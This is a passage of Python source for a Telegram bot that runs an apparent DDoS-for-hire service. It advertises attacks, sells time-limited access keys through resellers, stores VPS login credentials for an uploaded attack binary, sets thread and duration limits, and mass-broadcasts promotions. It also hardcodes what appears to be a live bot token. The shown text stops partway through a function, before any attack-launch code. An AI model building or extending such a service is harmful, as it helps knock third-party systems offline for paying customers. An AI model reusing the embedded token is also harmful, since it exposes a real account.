import os
import time
import logging
import re
import asyncio
import random
import json
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from telegram.ext import ChatMemberHandler
from telegram.helpers import escape_markdown
import paramiko
from scp import SCPClient
import sys
import subprocess
import asyncio
import logging
import threading
import shutil
from datetime import datetime
from pathlib import Path

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Global Variables
USER_VPS_SETTINGS = {}  # {user_id: vps_count}
USER_VPS_PREFERENCES = {}  # {user_id: preferred_vps_count}
GROUP_IMAGES = {}  # Store group images for specific groups or default

# Bot management system
BOT_INSTANCES = {}  # Stores running bot processes
BOT_CONFIG_FILE = "bot_configs.json"
BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data

# Image configuration for /start command
START_IMAGES = [
    {"url": "https://graph.org/file/e60742d4a79669e46a788.jpg", "caption": "Welcome to the official bot! Run by {owner_display_name} 🚀\n\nJoin our official group: {official_group_name}"},
    {"url": "https://graph.org/file/6f59239855519842a2010.jpg", "caption": "Experience powerful attacks with our bot, developed by {owner_display_name}!\n\nJoin our official group: {official_group_name}"},
    {"url": "https://graph.org/file/e760c7042a96f13e7311d.jpg", "caption": "Your ultimate DDoS solution is here, courtesy of {owner_display_name}!\n\nJoin our official group: {official_group_name}"},
    {"url": "https://graph.org/file/208034c4f9237617b01b2.jpg", "caption": "Reliable and effective attacks, brought to you by {owner_display_name}.\n\nJoin our official group: {official_group_name}"}
]
current_images = START_IMAGES # This will be the list of images used.
IMAGE_CONFIG_FILE = "image_config.json"
OFFICIAL_GROUP_NAME = "@OfficialDDoSTools" # Default official group name

TELEGRAM_BOT_TOKEN = '7622864970:AAF5zpg202jB4m1XBKR6Bj02XGpQ3Rem8Ks' # Replace with your actual bot token
OWNER_USERNAME = "Rajaraj909"
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-1002834218110] # Replace with your group ID
MAX_THREADS = 900
max_duration = 600
bot_open = False
SPECIAL_MAX_DURATION = 240
SPECIAL_MAX_THREADS = 2000
BOT_START_TIME = time.time()
DEFAULT_THREADS = 500  # Default thread count for regular attacks

OWNER_ID = 7922553903  # Replace with your Telegram User ID
COOWNER_IDS = []  # Other admin IDs
ACTIVE_VPS_COUNT = 6  # Default number of VPS to use for attacks

# Display Name Configuration
GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
DISPLAY_NAME_FILE = "display_names.json"

# Link Management
LINK_FILE = "links.json"
LINKS = {} # Stores dynamic links (e.g., for promotion)

# VPS Configuration
VPS_FILE = "vps.txt"
BINARY_NAME = "raja"
BINARY_PATH = f"/home/master/{BINARY_NAME}" # Default path on VPS
VPS_LIST = [] # Stores VPS details from vps.txt

# File to store key data
KEY_FILE = "keys.txt"

# Key Prices (customize as needed)
KEY_PRICES = {
    "1H": 5, "2H": 10, "3H": 15, "4H": 20, "5H": 25, "6H": 30, "7H": 35, "8H": 40,
    "9H": 45, "10H": 50, "1D": 60, "2D": 100, "3D": 160, "5D": 250, "7D": 320,
    "15D": 700, "30D": 1250, "60D": 2000,
}

# Special Key Prices (customize as needed)
SPECIAL_KEY_PRICES = {
    "1D": 70, "2D": 130, "3D": 250, "4D": 300, "5D": 400, "6D": 500, "7D": 550,
    "8D": 600, "9D": 750, "10D": 800, "11D": 850, "12D": 900, "13D": 950,
    "14D": 1000, "15D": 1050, "30D": 1500,
}

# Key System
keys = {} # Stores active keys: {key: {'expiration_time': float, 'generated_by': int}}
special_keys = {} # Stores active special keys: {key: {'expiration_time': float, 'generated_by': int}}
redeemed_users = {} # {user_id: expiration_time (float) or {'expiration_time': float, 'is_special': bool}}
redeemed_keys_info = {} # {key: {'generated_by': int, 'redeemed_by': int, 'is_special': bool}}
feedback_waiting = {} # For feedback system

# Reseller System
resellers = set() # Set of reseller user IDs
reseller_balances = {} # {user_id: balance}

# Global Cooldown
global_cooldown = 0 # In seconds
last_attack_time = 0 # Timestamp of the last global attack

# Track running attacks {attack_id: {'target': str, 'duration': int, 'user_id': int, 'vps_info': list of (ip, username, password)}}
running_attacks = {}


# Keyboards
group_user_keyboard = [
    ['/Start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status', '⏳ Uptime']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS'] # Removed "Remove VPS" from reseller as it's dangerous
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Settings menu keyboard with Reset VPS button
settings_keyboard = [
    ['Set Duration', 'Add Reseller'],
    ['Remove Reseller', 'Set Threads'],
    ['Add Coin', 'Set Cooldown'],
    ['Reset VPS', 'Back to Home']
]
settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)

# Owner Settings menu keyboard with bot management buttons
owner_settings_keyboard = [
    ['Add Bot', 'Remove Bot'],
    ['Bot List', 'Start Selected Bot'],
    ['Stop Selected Bot', 'Promote'],
    ['🔗 Manage Links', '📢 Broadcast'],
    ['🖼️ Set Group Image', '🔗 Set Group Link'],
    ['Change Image', 'Change Group Name'], # New buttons for image/name config
    ['Back to Home']
]
owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Settings', 'Generate Key'],
    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
    ['OpenBot', 'CloseBot', 'Menu'],
    ['⚙️ Owner Settings', '👥 Check Users'] # Added Check Users
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

co_owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['⏳ Uptime', 'Add VPS'] # Removed "Remove VPS" from co-owner too
]
co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)

# Menu keyboards
owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Add VPS', 'Remove VPS'],
    ['Add Co-Owner', 'Remove Co-Owner'],
    ['Set Display Name', 'Upload Binary'],
    ['Delete Binary', 'Back to Home']
]
owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)

co_owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Set Display Name', 'Add VPS'],
    ['Back to Home', 'Upload Binary']
]
co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)


# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13
ADD_GROUP_ID = 14
REMOVE_GROUP_ID = 15
MENU_SELECTION = 16
GET_RESELLER_INFO = 17
GET_VPS_INFO = 18
GET_VPS_TO_REMOVE = 19
CONFIRM_BINARY_UPLOAD = 20
GET_ADD_CO_OWNER_ID = 21
GET_REMOVE_CO_OWNER_ID = 22
GET_DISPLAY_NAME = 23
GET_GROUP_FOR_DISPLAY_NAME = 24
GET_BOT_TOKEN = 25
GET_OWNER_USERNAME = 26
SELECT_BOT_TO_START = 27
SELECT_BOT_TO_STOP = 28
CONFIRM_BINARY_DELETE = 29
GET_LINK_NUMBER = 30
GET_LINK_URL = 31
GET_VPS_COUNT = 32 # New state for setting VPS count
GET_NEW_IMAGE_URL = 33 # For changing image of /start
GET_NEW_GROUP_NAME = 34 # For changing official group name
GET_BROADCAST_MESSAGE = 35 # For broadcast command
GET_GROUP_LINK = 36 # For setting group specific links
GET_KEY_TYPE = 37 # To specify key type when generating

# Helper Functions
def get_uptime():
    """Calculates bot uptime."""
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def save_image_config():
    """Save image configuration to file"""
    config_data = {
        'start_images': START_IMAGES,
        'group_images': GROUP_IMAGES,
        'official_group_name': OFFICIAL_GROUP_NAME
    }
    with open(IMAGE_CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)

def load_image_config():
    """Load image configuration from file"""
    global START_IMAGES, GROUP_IMAGES, OFFICIAL_GROUP_NAME
    if os.path.exists(IMAGE_CONFIG_FILE):
        try:
            with open(IMAGE_CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
                START_IMAGES = config_data.get('start_images', [])
                GROUP_IMAGES = config_data.get('group_images', {})
                OFFICIAL_GROUP_NAME = config_data.get('official_group_name', "@OfficialDDoSTools")
        except (json.JSONDecodeError, ValueError):
            logging.warning("Error loading image_config.json, using default settings.")
            START_IMAGES = [] # Reset to default if corrupted
            GROUP_IMAGES = {}
            OFFICIAL_GROUP_NAME = "@OfficialDDoSTools"
    else:
        logging.info("image_config.json not found, using default settings.")
        START_IMAGES = [] # Reset to default if not found
        GROUP_IMAGES = {}
        OFFICIAL_GROUP_NAME = "@OfficialDDoSTools"
    # Ensure default start images are loaded if the file didn't have them
    if not START_IMAGES:
        START_IMAGES.extend([
            {"url": "https://graph.org/file/e60742d4a79669e46a788.jpg", "caption": "Welcome to the official bot! Run by {owner_display_name} 🚀\n\nJoin our official group: {official_group_name}"},
            {"url": "https://graph.org/file/6f59239855519842a2010.jpg", "caption": "Experience powerful attacks with our bot, developed by {owner_display_name}!\n\nJoin our official group: {official_group_name}"},
            {"url": "https://graph.org/file/e760c7042a96f13e7311d.jpg", "caption": "Your ultimate DDoS solution is here, courtesy of {owner_display_name}!\n\nJoin our official group: {official_group_name}"},
            {"url": "https://graph.org/file/208034c4f9237617b01b2.jpg", "caption": "Reliable and effective attacks, brought to you by {owner_display_name}.\n\nJoin our official group: {official_group_name}"}
        ])


def get_display_name(group_id=None):
    """Returns the styled display name for the owner, considering group-specific names."""
    if group_id and str(group_id) in GROUP_DISPLAY_NAMES:
        base_name = GROUP_DISPLAY_NAMES[str(group_id)]
        return f"🌟 {base_name} 🌟"
    return f"👑 {GROUP_DISPLAY_NAMES.get('default', OWNER_USERNAME)} 👑"

async def owner_settings(update: Update, context: CallbackContext):
    """Shows the owner settings menu."""
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='Markdown')
        return

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)

    await update.message.reply_text(
        f"⚙️ *Owner Settings Menu*\n\n"
        f"Select an option below:\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )

def get_group_image(group_id):
    """Get image for specific group or default"""
    group_id_str = str(group_id)
    if group_id_str in GROUP_IMAGES and GROUP_IMAGES[group_id_str].get('url'):
        return GROUP_IMAGES[group_id_str]
    return GROUP_IMAGES.get('default', {'url': '', 'caption': ''})

async def set_display_name_prompt(update: Update, context: CallbackContext):
    """Prompt for setting a display name."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can set display names!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)

    await update.message.reply_text(
        f"✍️ *Set Display Name*\n\n"
        f"Current Display Name: `{current_display_name}`\n\n"
        "To set a default display name (for private chat and groups without specific name), simply send the new name.\n"
        "To set a display name for a specific group, reply to a message in that group with `/set_display_name your_new_name`.",
        parse_mode='Markdown'
    )
    return GET_DISPLAY_NAME

async def set_display_name_handler(update: Update, context: CallbackContext):
    """Updates the display name for specific group or default."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can set display names!*", parse_mode='Markdown')
        return ConversationHandler.END

    new_name = update.message.text.strip()
    target_group_id = None
    target_chat_title = "default"

    if update.message.reply_to_message and update.message.reply_to_message.chat.type in ['group', 'supergroup']:
        target_group_id = str(update.message.reply_to_message.chat.id)
        target_chat_title = update.message.reply_to_message.chat.title
    elif update.effective_chat.type in ['group', 'supergroup']:
        target_group_id = str(update.effective_chat.id)
        target_chat_title = update.effective_chat.title

    if target_group_id:
        GROUP_DISPLAY_NAMES[target_group_id] = new_name
    else:
        GROUP_DISPLAY_NAMES['default'] = new_name

    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f, indent=4)

    await update.message.reply_text(
        f"✅ Display name updated to: *{new_name}*\n"
        f"{(f'for group *{target_chat_title}*' if target_group_id else 'as default name')}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

def load_vps():
    """Loads VPS connection details from vps.txt."""
    global VPS_LIST
    VPS_LIST = []
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            for line in f.readlines():
                line = line.strip()
                if line and len(line.split(',')) == 3:
                    VPS_LIST.append(line.split(','))
    logging.info(f"Loaded {len(VPS_LIST)} VPS entries.")

async def set_vps_count(update: Update, context: CallbackContext):
    """Handler for setting the number of active VPS servers for multi-VPS attacks."""
    try:
        if not (is_owner(update) or is_co_owner(update)):
            await update.message.reply_text(
                "🚫 *Access Denied*\nOnly owner or co-owners can configure VPS!",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        if not VPS_LIST:
            await update.message.reply_text(
                "❌ *No VPS Configured*\nPlease set up VPS servers first using the 'Add VPS' option!",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        user_id = update.effective_user.id
        current_user_vps_pref = USER_VPS_PREFERENCES.get(user_id, ACTIVE_VPS_COUNT)
        max_allowed = len(VPS_LIST) if is_owner(update) else min(4, len(VPS_LIST))

        status_msg = (
            f"⚙️ *VPS Configuration*\n\n"
            f"• Your current preferred active VPS: `{current_user_vps_pref}`\n"
            f"• Total Available VPS in system: `{len(VPS_LIST)}`\n"
            f"• Your Max Allowed VPS: `{max_allowed}`\n\n"
            f"Please enter your desired VPS count (1-{max_allowed}):"
        )

        keyboard_buttons = [[str(i) for i in range(1, min(max_allowed + 1, 5))]] # Provide 1-4 buttons or up to max_allowed
        keyboard_buttons.append(["Cancel"])

        await update.message.reply_text(
            status_msg,
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardMarkup(
                keyboard_buttons,
                one_time_keyboard=True
            )
        )
        return GET_VPS_COUNT

    except Exception as e:
        logging.error(f"Error in set_vps_count: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to initialize VPS configuration",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def set_vps_count_input(update: Update, context: CallbackContext):
    """Processes the input for setting the number of active VPS servers."""
    user_id = update.effective_user.id

    if update.message.text.lower() == 'cancel':
        await update.message.reply_text("❌ VPS count setting cancelled.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    try:
        count = int(update.message.text.strip())

        if is_owner(update):
            max_allowed = len(VPS_LIST)
        elif is_co_owner(update):
            max_allowed = min(4, len(VPS_LIST))
        else:
            await update.message.reply_text(
                "❌ *Only owner or co-owners can configure VPS!*",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            return ConversationHandler.END

        if 1 <= count <= max_allowed:
            USER_VPS_PREFERENCES[user_id] = count
            await update.message.reply_text(
                f"✅ *VPS Configuration Updated*\n"
                f"• Your preferred active VPS: *{count}*\n"
                f"• Max Allowed for you: *{max_allowed}*",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"User {user_id} set preferred VPS count to {count}")
        else:
            await update.message.reply_text(
                f"❌ *Invalid VPS Count*\n"
                f"You can only set between 1 and {max_allowed} VPS\n\n"
                f"*Your current preferred active VPS:* {USER_VPS_PREFERENCES.get(user_id, ACTIVE_VPS_COUNT)}",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Input*\nPlease enter a number between 1 and your max allowed VPS count",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    except Exception as e:
        logging.error(f"Error in set_vps_count_input: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to update VPS configuration",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

def save_resellers():
    """Save reseller data to file."""
    data = {
        'resellers': list(resellers),
        'balances': reseller_balances
    }
    with open('resellers.json', 'w') as f:
        json.dump(data, f, indent=4)
    logging.info("Reseller data saved.")

def load_resellers():
    """Load reseller data from file."""
    global resellers, reseller_balances
    if os.path.exists('resellers.json'):
        try:
            with open('resellers.json', 'r') as f:
                data = json.load(f)
                resellers.update(set(data.get('resellers', [])))
                reseller_balances.update(data.get('balances', {}))
            logging.info("Reseller data loaded.")
        except (json.JSONDecodeError, ValueError):
            logging.warning("Error loading resellers.json, starting with empty reseller data.")
            resellers = set()
            reseller_balances = {}
    else:
        logging.info("resellers.json not found, starting with empty reseller data.")
        resellers = set()
        reseller_balances = {}

async def promote(update: Update, context: CallbackContext):
    """Sends a promotional message with links to all groups and private chats that have interacted with the bot."""
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only owner can promote\\!*",
            parse_mode='MarkdownV2'
        )
        return

    promotion_message = (
        "🔰 *Join our groups for more information, free keys, and hosting details\\!*\n\n"
        "Click the buttons below to join\\:"
    )

    keyboard = []
    if 'link_1' in LINKS and LINKS['link_1']:
        keyboard.append([InlineKeyboardButton("Join Group 1", url=LINKS['link_1'])])
    if 'link_2' in LINKS and LINKS['link_2']:
        keyboard.append([InlineKeyboardButton("Join Group 2", url=LINKS['link_2'])])
    if 'link_3' in LINKS and LINKS['link_3']:
        keyboard.append([InlineKeyboardButton("Join Group 3", url=LINKS['link_3'])])
    if 'link_4' in LINKS and LINKS['link_4']:
        keyboard.append([InlineKeyboardButton("Join Group 4", url=LINKS['link_4'])])

    if not keyboard:
        await update.message.reply_text(
            "ℹ️ No links have been set up yet\\. Use the 'Manage Links' option to add links\\.",
            parse_mode='MarkdownV2'
        )
        return

    reply_markup = InlineKeyboardMarkup(keyboard)

    # Initial confirmation message to the owner
    await update.message.reply_text(
        "🚀 *Starting promotion to all chats...*\n"
        "This might take a while depending on the number of chats.",
        parse_mode='Markdown'
    )

    success_count = 0
    fail_count = 0
    group_success = 0
    private_success = 0

    all_chats = set()

    # Add all allowed group IDs
    for group_id in ALLOWED_GROUP_IDS:
        all_chats.add(group_id)

    # Add all private chats that have interacted
    if 'users_interacted' in context.bot_data:
        for user_id in context.bot_data['users_interacted']:
            all_chats.add(user_id)

    for chat_id in all_chats:
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=promotion_message,
                parse_mode='MarkdownV2',
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            success_count += 1

            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    group_success += 1
                else:
                    private_success += 1
            except Exception as e:
                logging.error(f"Error getting chat info for {chat_id}: {str(e)}")

            await asyncio.sleep(0.5) # Small delay to avoid rate limits
        except Exception as e:
            logging.error(f"Failed to send promotion to {chat_id}: {str(e)}")
            fail_count += 1

    await update.message.reply_text(
        f"📊 *Promotion Results*\n\n"
        f"✅ Successfully sent to\\: {success_count} chats\n"
        f"❌ Failed to send to\\: {fail_count} chats\n\n"
        f"• Groups\\: {group_success}\n"
        f"• Private chats\\: {private_success}",
        parse_mode='MarkdownV2'
    )

def load_links():
    """Load links from file."""
    global LINKS
    if os.path.exists(LINK_FILE):
        try:
            with open(LINK_FILE, 'r') as f:
                LINKS = json.load(f)
            logging.info("Links loaded.")
        except (json.JSONDecodeError, ValueError):
            logging.warning("Error loading links.json, starting with empty links.")
            LINKS = {}
    else:
        logging.info("links.json not found, starting with empty links.")
        LINKS = {}

def save_links():
    """Save links to file."""
    with open(LINK_FILE, 'w') as f:
        json.dump(LINKS, f, indent=4)
    logging.info("Links saved.")

async def manage_links(update: Update, context: CallbackContext):
    """Show link management menu."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can manage links!", parse_mode='Markdown')
        return ConversationHandler.END

    current_links_str = "\n".join([f"{i}. {LINKS.get(f'link_{i}', 'Not set')}" for i in range(1, 5)])

    await update.message.reply_text(
        f"🔗 *Link Management*\n\n"
        f"Current Links:\n{current_links_str}\n\n"
        "Enter the number (1, 2, 3, or 4) of the link you want to replace:",
        parse_mode='Markdown'
    )
    return GET_LINK_NUMBER

async def get_link_number(update: Update, context: CallbackContext):
    """Get which link number to update."""
    try:
        link_num = int(update.message.text)
        if link_num not in [1, 2, 3, 4]:
            raise ValueError

        context.user_data['editing_link'] = f"link_{link_num}"
        await update.message.reply_text(
            f"⚠️ Enter new URL for link {link_num}:",
            parse_mode='Markdown'
        )
        return GET_LINK_URL
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter 1, 2, 3, or 4.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

async def get_link_url(update: Update, context: CallbackContext):
    """Set the new URL for the selected link."""
    if 'editing_link' not in context.user_data:
        return ConversationHandler.END

    link_key = context.user_data['editing_link']
    new_url = update.message.text.strip()

    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with `http://` or `https://`.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    LINKS[link_key] = new_url
    save_links()

    context.user_data.pop('editing_link', None)

    await update.message.reply_text(
        "✅ Link updated successfully\\!\n"
        f"New URL: {escape_markdown(new_url, version=2)}",
        parse_mode='MarkdownV2',
        reply_markup=get_appropriate_markup(update)
    )
    return ConversationHandler.END

async def broadcast_start(update: Update, context: CallbackContext):
    """Initiates the broadcast process."""
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can broadcast messages\\!*",
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the message you want to broadcast to all channels, groups and private chats\\:*\n"
        "You can send text, photos \\(with optional caption\\), or documents \\(with optional caption\\)\\.\n\n"
        "Or reply to any message with /broadcast to forward it to all chats\\.",
        parse_mode='MarkdownV2'
    )
    return GET_BROADCAST_MESSAGE

async def broadcast_message(update: Update, context: CallbackContext):
    """Sends the broadcast message to all tracked chats."""
    message_to_broadcast = update.message.reply_to_message if update.message.reply_to_message else update.message

    results = {
        'success': 0,
        'failed': 0,
        'groups': 0,
        'private': 0
    }

    target_chats = set(ALLOWED_GROUP_IDS)
    if 'users_interacted' in context.bot_data:
        target_chats.update(context.bot_data['users_interacted'])

    await update.message.reply_text(
        "📢 *Starting broadcast...*\nThis may take a while.",
        parse_mode='Markdown'
    )

    for chat_id in target_chats:
        try:
            # Handle different message types
            if message_to_broadcast.text:
                await context.bot.send_message(chat_id=chat_id, text=message_to_broadcast.text, parse_mode='Markdown')
            elif message_to_broadcast.photo:
                await context.bot.send_photo(chat_id=chat_id, photo=message_to_broadcast.photo[-1].file_id, caption=message_to_broadcast.caption, parse_mode='Markdown')
            elif message_to_broadcast.document:
                await context.bot.send_document(chat_id=chat_id, document=message_to_broadcast.document.file_id, caption=message_to_broadcast.caption, parse_mode='Markdown')
            # Add other media types as needed (video, audio, etc.)
            else:
                logging.warning(f"Unsupported message type for broadcast from {message_to_broadcast.chat.id}")
                continue # Skip if message type is not supported

            results['success'] += 1

            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    results['groups'] += 1
                else:
                    results['private'] += 1
            except Exception as e:
                logging.warning(f"Couldn't determine chat type for {chat_id}: {e}")

            await asyncio.sleep(0.3) # Small delay to avoid rate limits
        except Exception as e:
            logging.error(f"Failed to broadcast to {chat_id}: {str(e)}")
            results['failed'] += 1

    report_message = (
        f"📊 *Broadcast Results*\n\n"
        f"✅ *Successfully sent to\\:* {results['success']} chats\n"
        f"❌ *Failed to send to\\:* {results['failed']} chats\n\n"
        f"• *Groups\\:* {results['groups']}\n"
        f"• *Private chats\\:* {results['private']}"
    )

    await update.message.reply_text(
        report_message,
        parse_mode='MarkdownV2',
        reply_markup=get_appropriate_markup(update)
    )
    return ConversationHandler.END

def load_display_name():
    """Loads the display names from file."""
    global GROUP_DISPLAY_NAMES
    if os.path.exists(DISPLAY_NAME_FILE):
        try:
            with open(DISPLAY_NAME_FILE, 'r') as f:
                loaded_names = json.load(f)
            # Convert string keys to int for group IDs if necessary
            new_dict = {}
            for k, v in loaded_names.items():
                try:
                    if k != 'default':
                        new_dict[int(k)] = v
                    else:
                        new_dict[k] = v
                except ValueError:
                    # Keep as string if not an integer (e.g., 'default')
                    new_dict[k] = v
            GROUP_DISPLAY_NAMES = new_dict
            logging.info("Display names loaded.")
        except (json.JSONDecodeError, ValueError):
            logging.warning("Error loading display_names.json, starting with default.")
            GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}
    else:
        logging.info("display_names.json not found, starting with default.")
        GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}

def load_keys():
    """Loads keys, special keys, and redeemed user data from KEY_FILE."""
    global keys, special_keys, redeemed_users, redeemed_keys_info
    keys = {}
    special_keys = {}
    redeemed_users = {}
    redeemed_keys_info = {}

    if not os.path.exists(KEY_FILE):
        logging.info(f"Key file '{KEY_FILE}' not found. Starting with no keys.")
        return

    try:
        with open(KEY_FILE, "r") as file:
            for line in file:
                line = line.strip()
                if not line:
                    continue
                try:
                    key_type, key_data = line.split(":", 1)
                    if key_type == "ACTIVE_KEY":
                        parts = key_data.split(",", 2) # Split by comma, max 2 times
                        key = parts[0]
                        expiration_time = float(parts[1])
                        generated_by = int(parts[2]) if len(parts) > 2 else None
                        keys[key] = {
                            'expiration_time': expiration_time,
                            'generated_by': generated_by
                        }
                    elif key_type == "REDEEMED_KEY":
                        key, generated_by, redeemed_by, expiration_time = key_data.split(",", 3)
                        redeemed_users[int(redeemed_by)] = float(expiration_time)
                        redeemed_keys_info[key] = {
                            'generated_by': int(generated_by),
                            'redeemed_by': int(redeemed_by),
                            'is_special': False
                        }
                    elif key_type == "SPECIAL_KEY":
                        key, expiration_time, generated_by = key_data.split(",", 2)
                        special_keys[key] = {
                            'expiration_time': float(expiration_time),
                            'generated_by': int(generated_by)
                        }
                    elif key_type == "REDEEMED_SPECIAL_KEY":
                        key, generated_by, redeemed_by, expiration_time = key_data.split(",", 3)
                        redeemed_users[int(redeemed_by)] = {
                            'expiration_time': float(expiration_time),
                            'is_special': True
                        }
                        redeemed_keys_info[key] = {
                            'generated_by': int(generated_by),
                            'redeemed_by': int(redeemed_by),
                            'is_special': True
                        }
                except ValueError as e:
                    logging.error(f"Error parsing key line: '{line}' - {e}")
        logging.info(f"Loaded {len(keys)} active keys, {len(special_keys)} special keys, {len(redeemed_users)} redeemed users.")
    except Exception as e:
        logging.error(f"Failed to load keys from '{KEY_FILE}': {e}")

def save_keys():
    """Saves active keys, special keys, and redeemed user data to KEY_FILE."""
    with open(KEY_FILE, "w") as file:
        # Save active general keys
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info.get('generated_by', 'None')}\n")

        # Save active special keys
        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info.get('generated_by', 'None')}\n")

        # Save redeemed keys info (for tracking who redeemed what)
        for key, key_info in redeemed_keys_info.items():
            redeemed_by_id = key_info['redeemed_by']
            if redeemed_by_id in redeemed_users:
                user_redeem_data = redeemed_users[redeemed_by_id]
                if isinstance(user_redeem_data, dict) and user_redeem_data.get('is_special'):
                    if user_redeem_data['expiration_time'] > time.time():
                        file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{redeemed_by_id},{user_redeem_data['expiration_time']}\n")
                elif isinstance(user_redeem_data, float):
                    if user_redeem_data > time.time():
                        file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{redeemed_by_id},{user_redeem_data}\n")
    logging.info("Key data saved.")


def load_bot_configs():
    """Load bot configurations from file with error handling."""
    if not os.path.exists(BOT_CONFIG_FILE):
        logging.info("Bot config file not found. Returning empty list.")
        return []

    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            configs = json.load(f)
            if not isinstance(configs, list):
                logging.error("Invalid bot configs format, resetting to empty list.")
                return []
            return configs
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error loading bot configs: {e}. Returning empty list.")
        return []

def save_bot_configs(configs):
    """Save bot configurations to file with error handling."""
    try:
        with open(BOT_CONFIG_FILE, 'w') as f:
            json.dump(configs, f, indent=2)
        logging.info("Bot configurations saved.")
    except (json.JSONDecodeError, ValueError, IOError) as e:
        logging.error(f"Error saving bot configs: {e}.")

def is_allowed_group(update: Update):
